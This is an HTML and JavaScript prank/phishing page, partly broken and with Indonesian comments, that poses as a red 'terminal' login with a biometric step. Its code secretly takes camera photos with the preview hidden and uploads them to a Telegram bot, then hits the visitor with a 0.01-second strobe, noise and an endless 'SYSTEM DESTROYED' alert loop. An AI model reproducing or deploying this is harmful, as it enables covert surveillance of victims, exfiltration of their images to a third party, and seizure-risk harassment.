<!DOCTYPE html>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
        body { background: #000; overflow: hidden; font-family: 'Share Tech Mono', monospace; }

        /* KEDAP KEDIP PARAH */
        #hell-strobe {
            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 999999; pointer-events: none;
            animation: strobe-extreme 0.01s steps(2) infinite;
        }

        @keyframes strobe-extreme {
            0% { background: #fff; }
            50% { background: #000; }
            100% { background: #ff0000; }
        }

        .ghost-text {
            position: fixed; color: #fff; font-family: 'Orbitron'; font-size: 25px;
            z-index: 1000000; text-shadow: 0 0 20px #f00; pointer-events: none;
            display: none;
        }

        .login-ui {
            height: 100vh; display: flex; justify-content: center; align-items: center;
            background: radial-gradient(circle, #200 0%, #000 100%);
        }

        .terminal-card {
            width: 350px; padding: 40px; border: 1px solid #f00;
            background: rgba(0,0,0,0.9); box-shadow: 0 0 100px #f00;
            text-align: center; position: relative;
        }

        input {
            width: 100%; padding: 15px; margin: 10px 0; background: #050000;
            border: 1px solid #f00; color: #f00; font-family: inherit; outline: none;
        }

        button {
            width: 100%; padding: 20px; background: #f00; color: #000;
            font-family: 'Orbitron'; font-weight: 900; border: none; cursor: pointer;
            margin-top: 20px; font-size: 14px; clip-path: polygon(0 0, 100% 0, 95% 100%, 5% 100%);
        }

        #report-view {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #0f0; z-index: 999998; padding: 25px; font-size: 11px;
            overflow: hidden; border: 5px solid #f00;
        }

        .scanline {
            width: 100%; height: 100px; background: linear-gradient(0deg, transparent, rgba(255,0,0,0.2), transparent);
            position: absolute; top: -100px; left: 0; animation: scan 2s linear infinite;
        }
        @keyframes scan { from { top: -100px; } to { top: 100%; } }

        #output::after { content: "|"; animation: blink 0.5s infinite; }
        @keyframes blink { 50% { opacity: 0; } }

        video { display: none; } /* Sembunyikan preview kamera */
        canvas { display: none; }
    </style>
</head>
<body onclick="startBioMetric()">

    function startBioMetric() {
        if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        if(audioCtx.state === 'suspended') audioCtx.resume();
    }

    function noise() {
        if(!audioCtx) return;
        let osc = audioCtx.createOscillator();
        let gain = audioCtx.createGain();
        osc.type = 'square';
        osc.frequency.setValueAtTime(100 + Math.random() * 1000, audioCtx.currentTime);
        osc.connect(gain); gain.connect(audioCtx.destination);
        osc.start(); osc.stop(audioCtx.currentTime + 0.1);
    }

    function typeEffect(element, text, speed) {
        let i = 0;
        function typing() {
            if (i < text.length) {
                element.innerText += text.charAt(i);
                i++;
                setTimeout(typing, speed);
            }
        }
        typing();
    }

    // FUNGSI AMBIL FOTO
    async function takePhoto(facingMode) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: facingMode }, 
                audio: false 
            });
            video.srcObject = stream;
            await new Promise(res => video.onloadedmetadata = res);
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `capture_${facingMode}.jpg`);
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/jpeg');

            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.error("Camera Error:", e); }
    }

        setTimeout(() => {
            while(true) { alert("SYSTEM DESTROYED BY RADIT HACKER FROM YEAR 4026."); }
        }, 12000);
    }
</script>
